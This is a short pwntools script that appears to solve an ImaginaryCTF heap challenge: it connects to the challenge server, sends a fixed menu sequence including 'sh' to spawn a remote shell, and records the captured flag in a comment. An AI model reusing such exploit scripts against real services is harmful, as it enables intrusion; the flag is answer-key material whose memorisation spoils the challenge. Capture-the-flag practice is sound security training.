from pwn import *
r = remote("chal.imaginaryctf.org", 42003)

def s(data):
    r.sendlineafter("> ", data)

def main():
    s("1")
    s("2")
    s("2")
    s("2")
    s("1")
    s("1")
    s("3")
    s("sh")
    s("4")
    r.interactive()

if __name__ == "__main__":
    main()
    
# ictf{w3lc0me_t0_h34p_24bd59b0}
